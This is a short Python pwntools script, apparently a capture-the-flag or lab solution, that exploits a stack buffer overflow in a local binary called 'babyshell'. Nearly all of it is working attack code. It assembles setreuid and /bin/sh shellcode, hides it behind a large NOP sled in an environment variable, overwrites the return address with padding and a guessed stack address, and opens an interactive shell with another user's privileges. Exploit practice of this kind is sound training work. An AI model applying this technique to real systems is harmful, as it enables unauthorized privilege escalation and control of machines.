#!/usr/bin/env python3
from pwn import *

# set environment
context(arch="i386", os="linux")

# shell code to set uid
payload = asm(shellcraft.setreuid(uid='1006'))

# shell code main body
# build shell code in assembly language
assemblyCode = shellcraft.sh()

# assemble the assembly code
byteCode = asm(assemblyCode)

# create process
#io = process("./babyshell")
io = process('./babyshell', env={'payload': b'\x90'* 100000 + payload + byteCode})

# receive
print(io.recvline())



# build address
# eax = 0x8048590
# address = b'\x90\x85\x04\x08'
# environment address: 0xffffd343
address = int(0xffbb0000)

# build input string
# input_bytes = b'\x68' * 0x8c + address + b'\x90' * 1000 + payload + byteCode
input_bytes = b'\x68' * 0x8c + p32(address)

# send input bytes
io.sendline(input_bytes)

        

# interact with bash
io.interactive()

